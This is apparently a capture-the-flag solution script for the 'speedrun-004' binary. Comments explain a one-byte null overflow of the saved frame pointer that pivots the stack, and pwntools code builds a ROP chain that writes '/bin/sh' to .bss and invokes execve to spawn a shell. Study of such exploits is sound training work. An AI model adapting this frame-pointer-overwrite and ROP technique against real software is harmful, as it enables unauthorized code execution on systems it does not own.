# junk payload of 256 bytes plus 0x00 overflow byte (257 bytes total ) is sent within fgets() called at 0x400baf, and the 0x00 byte overflows the least significant byte of the frame pointer address that is located on the stack and ends up popped into RBP as part of leave() instruction inside fgets()
# after that, execution returns back to scanInput() (which called fgets()), and here everything proceeds normally until the leave;ret instructions: at leave instruction, value in RBP (frame pointer address whose least significant byte was overwritten in fgets()) is moved to ESP, and this effectively moves the stack pointer to a different location on stack, where we place our ROP chain. This chain is executed in the next instruction in scanInput(), which after this last leave instruction is a ret instruction, which pops the ROP gadget address into RIP and the exploit begins

from pwn import *

target = process('./speedrun-004')
popRax = p64(0x415f04)
popRdi = p64(0x400686)
popRsi = p64(0x410a93)
popRdx = p64(0x44a155)
syscall = p64(0x40132c)
ret = p64(0x400416)
mov = p64(0x48d301)
bss = p64(0x6b6030)
binsh = p64(0x0068732f6e69622f)
rop = b""
rop += popRax
rop += bss
rop += popRdx
rop += binsh
rop += mov

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += bss

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)
rop += syscall

payload = ret * int((256 - len(rop)) / 8) + rop + b"\x00"

target.sendline('257')
# raw_input()
target.sendline(payload)
target.interactive()
